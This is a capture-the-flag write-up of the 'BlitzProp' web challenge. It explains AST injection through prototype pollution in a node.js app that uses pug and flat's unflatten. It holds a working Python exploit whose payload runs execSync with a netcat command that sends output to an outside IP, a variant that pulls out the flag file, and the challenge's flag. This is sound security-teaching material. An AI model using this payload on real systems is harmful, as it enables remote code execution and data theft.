# BlitzProp

> *A tribute page for the legendary alien band called BlitzProp!*
> *This challenge will raise 33 euros for a good cause.*

Taking a look at the website, it seems like a simple node.js web application which contains a single user input, hinting towards the hidden vulnerability

![image-20210423163531775](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/BlitzProp-1.png?raw=true)

Navigating deeper to the given source code, there's the most important file to pay attention to, which is `index.js` inside the `routes` directory

```js
const path              = require('path');
const express           = require('express');
const pug               = require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
	process.mainModule.require('child_process').execSync(`whoami`);
    const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});

module.exports = router;
```

At first I thought it was a type of classic Prototype Pollution attacks through the `unflatten` user input, but I couldn't find a way to make the pollution

After a little bit of researching I quickly found a useful article relating to this kind of vulnerability, which is AST Injection : https://blog.p6.is/AST-Injection/#Exploit

For pug template engine, when you insert AST into the `Object.prototype.block`, the compiler adds it to the buffer by referring to the value

With pug, each process is separated into a separate module. AST generated by `pug-parser` is passed to the `pug-code-gen` and made into a function. Finally, it will be executed

Along with other detailed and useful information from the article, an attack for this scenario can be configured like this :

```python
import requests

TARGET_URL = 'http://139.59.176.252:30959'

r = requests.post(TARGET_URL+'/api/submit', json = {
    "song.name":"1. Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`nc 1.52.183.253 4444 -e ls -la`)"
    }
})

print(r.status_code)
print(r.text)
```

Using the OAST technique, we get the content of the web server directory :

![image-20210423171244661](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/BlitzProp-2.png?raw=true)

As we can see, the flag file is right in the current directory. I simply recrafted the script and tried to exfiltrate the file content, I changed the injecting command into `cat flag*` and triggered the out-of-band interaction once again

![image-20210423172049890](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/BlitzProp-3.png?raw=true)

Flag :

```
CHTB{p0llute_with_styl3}
```

